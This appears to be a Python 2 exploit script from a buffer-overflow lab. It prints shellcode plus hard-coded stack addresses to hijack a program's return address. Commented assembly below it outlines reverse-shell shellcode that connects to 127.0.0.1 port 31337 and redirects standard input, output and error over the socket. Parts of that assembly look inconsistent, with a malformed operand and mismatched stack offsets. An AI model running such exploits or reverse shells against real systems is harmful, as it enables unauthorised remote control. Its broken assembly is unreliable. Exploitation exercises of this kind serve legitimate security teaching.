from struct import pack
from shellcode import shellcode

#ebp = 0xbffe9598

preShellcode = ""

print preShellcode + shellcode + '\x12'*0 + pack("<I", 0xbffe8d88) + pack("<I", 0xbffe959c)

#xorl %ebx, %ebx
#xorl %ecx, %ecx	#clear registers
#xorl %edx, %edx
#xorl %eax, %eax

#pushl        %ebp
#movl         %esp, %ebp	#make room for local vars
#subl         $40, %esp        

        # parameters for socket(2) 
#movl         $2, -12(%ebp) # PF_INET
#movl         $1, -8(%ebp)  # SOCK_STREAM
#movl         $0, -4(%ebp) 

        # invoke socketcall
#movl         $102, %eax          #socketcall
#movl         $1, %ebx            #socket
#leal         -12(%ebp), %ecx     #address of parameter array
#int          $0x80
#movl         %eax, -16(%ebp)	

#movl	$2, -36(%ebp)
#movw	$0x697a, -34(ebp)	#port 31337
#movl	$0x0100007f, -32(%ebp)	#ip 127.0.0.1
 
#movl	$102, %eax
#movl	$3, %ebx		#parameters for socketcall connect
#leal	-24(%ebp), %ecx
#int	$0x80			#invoke connect


#redirecting std
#xorl %ebx, %ebx
#xorl %ecx, %ecx	#clear registers again
#xorl %edx, %edx
#xorl %eax, %eax

#movb $63, %al
#movl -24(%ebp), %ebx	#parameters for dup2 (stdin)
#int $0x80

#movb $63, %al
#movb $1, %cl		#parameters for dup2 (stdout)
#int $0x80

#movb $63, %al
#movb $2, %cl		#parameters for dup2 (stderr)
#int $0x80

##print shellcode afterwards##
